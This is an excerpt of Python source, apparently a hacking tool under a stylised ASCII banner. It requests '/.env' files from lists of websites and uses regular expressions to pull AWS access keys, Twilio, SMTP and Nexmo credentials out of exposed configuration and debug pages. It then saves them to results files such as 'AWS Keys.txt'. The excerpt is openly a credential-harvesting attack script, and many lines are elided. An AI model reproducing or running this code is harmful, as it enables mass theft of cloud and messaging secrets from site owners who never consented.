    ...
    try:
        if "AWS_ACCESS_KEY_ID" in resp:
            ...
            if aws_key == '' or aws_sec == '' or aws_key == 'null' or aws_sec == 'null':
                ...
                aws = open('Results/AWS Keys.txt', 'a')
                aws.write(remover+'\n')
                aws.close()
...
def get_twillio(star, resp):
    try:
        if "TWILIO" in resp:
            if "TWILIO_SID" in resp:
                acc_sid = reg('<td>TWILIO_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', resp)[0]
...
def grabb(star):
    ...
    star = star.replace('\n', '').replace('\r', '')
    try:
        resp = r.get(star + "/.env", headers=headers, timeout=30).text
        if 'DB_HOST' in resp:
            get_aws(star, resp)
            get_smtp(star, resp)
            get_nexmo(star, resp)
...
def xproad():
    ...
    |  \/  |               |  __ \         | |   | |      {red}
    | .  . | {gr}Zae3m{red}__ ___  | |  \/_ __ __ _| |__ | |__   ___ _ __ {ble}
